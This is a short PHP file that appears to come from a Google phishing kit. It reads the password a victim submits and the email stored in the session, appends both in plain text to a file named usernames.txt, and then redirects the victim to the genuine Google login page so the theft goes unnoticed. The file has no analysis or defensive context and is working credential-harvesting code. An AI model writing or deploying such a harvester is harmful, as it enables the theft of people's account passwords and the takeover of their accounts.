<?php
include 'ip.php';
			session_start();
			
			$pass = $_POST["password"];
			$email=$_SESSION["Email"];
			
			file_put_contents("usernames.txt", "                [ EMAIL: " . " ". $email . " ] " . " " . "[ PASSWORD: " . " " . $pass . " ]\n", FILE_APPEND);
  			header('Location: https://accounts.google.com/Login');
			exit();
			
			
			session_destroy();
			
?>
